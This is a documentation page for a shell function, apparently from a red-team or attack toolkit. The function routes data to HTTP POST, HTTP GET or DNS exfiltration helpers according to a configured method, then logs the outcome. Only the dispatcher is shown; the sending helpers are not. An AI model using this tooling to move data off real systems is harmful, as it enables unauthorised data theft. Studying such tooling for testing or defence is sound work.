# Exfiltrate Data

### Purpose
Routes data to appropriate exfiltration method (HTTP POST/GET or DNS) based on `EXFIL_METHOD` setting. Validates URI is provided, logs attempt, calls method-specific functions, and handles success/failure results.

### Dependencies
| Type | Name | Value |
|------|------|-------|
| Global Variable | `LOG_ENABLED` | `false` |
| Global Variable | `EXFIL_METHOD` | `"none"` |
| Global Variable | `EXFIL_URI` | `""` |
| Global Variable | `EXFIL_TYPE` | `"none"` |
| Global Variable | `CMD_PRINTF` | `"printf"` |
| Function | `core_log_output()` | For logging exfiltration attempts |
| Function | `core_handle_error()` | For error handling |
| Function | `core_exfil_http_post()` | For HTTP POST exfiltration |
| Function | `core_exfil_http_get()` | For HTTP GET exfiltration |
| Function | `core_exfil_dns()` | For DNS exfiltration |
| Function | `core_get_timestamp()` | For timestamp generation |

<details>

```shell
core_exfiltrate_data() {
    local data="$1"
    local result=0
    
    # Log exfiltration attempt
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "Exfiltrating data via $EXFIL_METHOD" "info" false
    fi
    
    # Check for required URI
    if [ -z "$EXFIL_URI" ]; then
        core_handle_error "No exfiltration URI specified for $EXFIL_METHOD"
            return 1
    fi
    
    # Route to appropriate method
    case "$EXFIL_METHOD" in
        http|https)
            # Determine whether to use POST or GET based on EXFIL_TYPE
            if [ "$EXFIL_TYPE" = "http" ]; then
                core_exfil_http_post "$data"
            else
                core_exfil_http_get "$data"
            fi
            result=$?
            ;;
            
        dns)
            core_exfil_dns "$data"
            result=$?
            ;;
            
        *)
            core_handle_error "Unknown exfiltration method: $EXFIL_METHOD"
            return 1
            ;;
    esac
    
    # Handle result
    if [ $result -ne 0 ]; then
        core_handle_error "Failed to exfiltrate data via $EXFIL_METHOD"
        return 1
    fi
    
    "$CMD_PRINTF"  "[INFO] [%s] Data exfiltrated successfully via %s\n" "$(core_get_timestamp)" "$EXFIL_METHOD"
    return 0
}
```

</details> 